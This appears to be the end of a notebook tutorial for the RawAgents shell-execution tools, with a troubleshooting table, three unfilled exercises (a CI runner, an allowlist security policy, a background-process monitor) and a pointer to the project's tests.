| Sandbox not available | Install `bubblewrap` (Linux) or check macOS `sandbox-exec` |
| Async errors | Ensure `await` on all tool calls |
| Import errors | Ensure `rawagents` is installed: `pip install -e .` |

---

## Exercises

Try these exercises to deepen your understanding:

### Exercise 1: Build a CI Runner

Create a workflow that:
1. Starts a test suite in background
2. Periodically reads output
3. Detects pass/fail
4. Kills the process if it takes too long

In [ ]:
# Exercise 1: Your code here
pass

### Exercise 2: Custom Security Policy

Create a `ShellSecurityContext` that:
1. Only allows `git`, `npm test`, and `python -m pytest` commands
2. Sets a 30-second timeout
3. Sources a project-specific env file
4. Test that everything else is blocked

In [ ]:
# Exercise 2: Your code here
pass

### Exercise 3: Background Process Monitor

Write a function that:
1. Starts 3 background processes
2. Monitors all of them in a loop
3. Reports which ones finish first
4. Cleans up any that are still running

In [ ]:
# Exercise 3: Your code here
pass

---

**Created for RawAgents Shell Command Execution Tools**

For more information, see the [README](./shell/README.md) or run:
```bash
pytest tests/tools/builtin/shell/ -v
```